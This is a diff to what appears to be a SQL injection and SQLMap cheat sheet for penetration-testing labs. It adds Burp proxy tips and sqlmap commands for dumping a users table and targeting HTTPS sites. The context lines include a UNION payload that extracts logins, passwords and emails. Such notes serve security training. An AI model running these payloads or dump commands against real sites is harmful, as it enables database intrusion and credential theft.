@@ -201,6 +201,7 @@ The purpose of this step is to find the column whose content is displayed on the
 #Collect important data
 1' UniOn Select 1,2,3,gRoUp_cOncaT(login,0x3a,password,0x3a,email) fRoM users--
 ```
+*Note: after using Repeater to check and have found the payload to attack, you can directly use burp to redirect the login. Enter the payload at Intercept (Proxy) and press Forward.*
 # SQLMap - Cheetsheat
 ## Basic arguments for SQLmap
 ```console
@@ -258,8 +259,14 @@ sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics 
 ```
 Get data from a table
 ```console
-python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
+sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
 ```
+With HTTPS
+```console
+sqlmap.py -r request.req --force-ssl --batch
+```
+Using **--force-ssl** for the HTTPS site, and **--batch** will accept the default answers to all the prompts that pop up.
+
 *In most lab scenarios, the database will be MySQL so we can add the **--dbms=mysql** parameter to the command line*
 ```console
 sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs --dbms=mysql
